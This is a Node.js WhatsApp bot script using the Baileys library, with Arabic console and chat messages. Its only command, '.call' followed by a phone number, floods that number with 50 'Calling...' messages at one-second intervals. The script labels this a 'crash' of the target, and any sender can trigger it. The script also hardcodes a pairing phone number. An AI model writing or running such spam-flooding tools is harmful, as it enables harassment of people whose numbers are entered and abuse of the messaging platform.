const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');

const MY_PHONE_NUMBER = '2499148219675'; 

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    const sock = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(MY_PHONE_NUMBER);
                console.log(`\n=========================================`);
                console.log(`🔗 كود الربط بتاعك: ${code}`);
                console.log(`=========================================\n`);
            } catch (err) {
                console.log(`❌ خطأ في جلب الكود: ${err.message}`);
            }
        }, 3000);
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startBot();
        } else if (connection === 'open') {
            console.log('\n✅ تم ربط واتساب بنجاح!');
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
        const sender = msg.key.remoteJid;

        if (text && text.startsWith('.call ')) {
            const targetNumber = text.split(' ')[1];
            if (!targetNumber) {
                await sock.sendMessage(sender, { text: '❌ اكتب الرقم بعد الأمر.' });
                return;
            }

            await sock.sendMessage(sender, { text: `🚀 بدء الكراش للرقم ${targetNumber}...` });

            let count = 0;
            for (let i = 0; i < 50; i++) { 
                try {
                    await sock.sendMessage(targetNumber + '@s.whatsapp.net', { text: 'Calling...' });
                    count++;
                } catch (err) {}
                await new Promise(r => setTimeout(r, 1000));
            }
            await sock.sendMessage(sender, { text: `✅ تم إرسال ${count} طلب.` });
        }
    });
}

startBot();
